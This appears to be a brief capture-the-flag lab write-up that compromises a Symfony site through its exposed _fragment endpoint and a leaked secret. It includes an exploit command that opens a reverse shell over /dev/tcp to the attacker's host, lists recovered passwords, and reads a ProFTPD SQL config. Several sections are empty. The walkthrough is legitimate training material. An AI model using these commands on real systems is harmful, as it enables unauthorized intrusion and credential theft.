#Pwned! 
```
192.168.205.233
```
## Nmap
```PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 61 ProFTPD
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH6PH1/ST7TUJ4Mp/l4c7G+TM07YbX7YIsnHzq1TRpvtiBh8MQuFkL1SWW9+za+h6ZraqoZ0ewwkH+0la436t9Q+2H/Nh4CntJOrRbpLJKg4hChjgCHd5KiLCOKHhXPs/FA3mm0Zkzw1tVJLPR6RTbIkkbQiV2Zk3u8oamV5srWIJeYUY5O2XXmTnKENfrPXeHup1+3wBOkTO4Mu17wBSw6yvXyj+lleKjQ6Hnje7KozW5q4U6ijd3LmvHE34UHq/qUbCUbiwY06N2Mj0NQiZqWW8z48eTzGsuh6u1SfGIDnCCq3sWm37Y5LIUvqAFyIEJZVsC/UyrJDPBE+YIODNbN2QLD9JeBr8P4n1rkMaXbsHGywFtutdSrBZwYuRuB2W0GjIEWD/J7lxKIJ9UxRq0UxWWkZ8s3SNqUq2enfPwQt399nigtUerccskdyUD0oRKqVnhZCjEYfX3qOnlAqejr3Lpm8nA31pp6lrKNAmQEjdSO8Jxk04OR2JBxcfVNfs=
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0EdIHR7NOReMM0G7C8zxbLgwB3ump+nb2D3Pe3tXqp/6jNJ/GbU2e4Ab44njMKHJbm/PzrtYzojMjGDuBlQCg=
|   256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDCc0saExmeDXtqm5FS+D5RnDke8aJEvFq3DJIr0KZML
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome!
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 2 disallowed entries 
|_/app_dev.php /app_dev.php/*
|_http-favicon: Unknown favicon MD5: 231567A8CC45C2CF966C4E8D99A5B7FD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Nmap UDP


# Enumeration
## FTP
```
searchsploit -x linux/remote/36803.py
```

## HTTP
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241006105947.png?raw=true)
```
http://192.168.205.233/app_dev.php
```

logged as anon.

symfony 3.4.46
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241006111437.png?raw=true)
https://symfony.com/doc/3.x/best_practices/configuration.html
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241006115150.png?raw=true)

```
python symfony-exploit.py -s '48a8538e6260789558f0dfe29861c05b' http://192.168.205.233/_fragment -a sha256 --function system --arguments 'id' --method 3
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241006121524.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241006121536.png?raw=true)

user benoit

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241006121753.png?raw=true)
```
python symfony-exploit.py -s '48a8538e6260789558f0dfe29861c05b' http://192.168.205.233/_fragment -a sha256 --function system --arguments '0<&196;exec 196<>/dev/tcp/192.168.45.200/80; sh <&196 >&196 2>&196' --method 3
```

# PrivEsc

## Manual

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241006122830.png?raw=true)

v3ryS3kr1t
d3cryptPr1v4t3K3y
0beec7b5ea3f0fdbc95d0dd47f3c5bc275da8a33
p@ssw0rd
cat /etc/proftpd/sql.conf
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241006130024.png?raw=true)



![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241006125859.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241006130148.png?raw=true)
change password
create hash
```
/bin/echo "{md5}"`/bin/echo -n "password" | openssl dgst -binary -md5 | openssl enc -base64`
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241006130747.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241006151309.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241006151235.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241006151442.png?raw=true)


## Automated

### Peass
### Mimikatz


